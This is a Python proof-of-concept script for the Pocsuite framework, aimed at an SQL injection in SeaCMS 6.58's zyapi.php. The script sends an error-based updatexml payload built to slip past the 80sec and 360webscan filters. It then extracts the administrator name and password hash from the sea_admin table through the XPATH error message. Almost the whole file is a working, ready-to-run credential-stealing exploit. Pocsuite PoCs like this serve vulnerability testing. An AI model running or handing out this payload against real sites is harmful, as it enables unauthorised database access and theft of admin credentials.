#!/usr/bin/python
# -*- coding: utf-8 -*-


# If you have issues about development, please read:
# https://github.com/knownsec/Pocsuite/blob/master/docs/CODING.md
# https://github.com/knownsec/Pocsuite/blob/master/docs/COPYING

from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
import re


def send_command(url):
	try:
		httpreq = req.Session()
		headers ={
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
		"Accept-Encoding": "gzip, deflate",
		"Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
		"Connection": "close",
		"Cookie": "_gauges_unique_month=1; _gauges_unique_year=1; _gauges_unique=1; _gauges_unique_hour=1; _gauges_unique_day=1",
		"Host": "httpbin.org",
		"Referer": "http://httpbin.org/",
		"Upgrade-Insecure-Requests": "1",
		"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
		 }


		resp = httpreq.get(url, headers=headers)
	except:
		resp = None
	return resp


class TestPOC(POCBase):
	name = 'seacms前台一处鸡肋报错注入，绕过80sec，360webscan获取数据'.decode('utf-8')
	vulID = '0'
	author = ['小雨']
	vulType = 'sql_inj'
	version = '1.0'  # default version: 1.0
	references = ['https://www.t00ls.net/thread-43489-1-1.html']
	createDate = '2018.01.04'
	appName = 'seacms'
	appVersion = '6.58'


	def _attack(self):
		'''attack mode'''
		result = {}
		self.url = self.url + "/zyapi.php?ac=videolist&ids=1)%20or%20char(@`%27`)%20or%20updatexml(1,(select%20concat_ws(0x7e,0x7e,name,password)%20from%23%0asea_admin),1)%23%27"

		resp = send_command(self.url)
		if resp and resp.text and resp.status_code == 200:
			info = re.findall(r'Error infos: XPATH syntax error: \'~~(.+?)\'', resp.text)
			if len(info) > 0:
				info1 = info[0].split('~')
				result['Database'] = {}
				result['Database']['user'] = info1[0]
				result['Database']['password'] = info1[1]


		return self.parse_output(result)

	def _verify(self):
		'''verify mode'''
		return self._attack()

	def parse_output(self, result):
		output = Output(self)
		if result:
			output.success(result)
		else:
			output.fail('Internet nothing returned')
		return output


register(TestPOC)
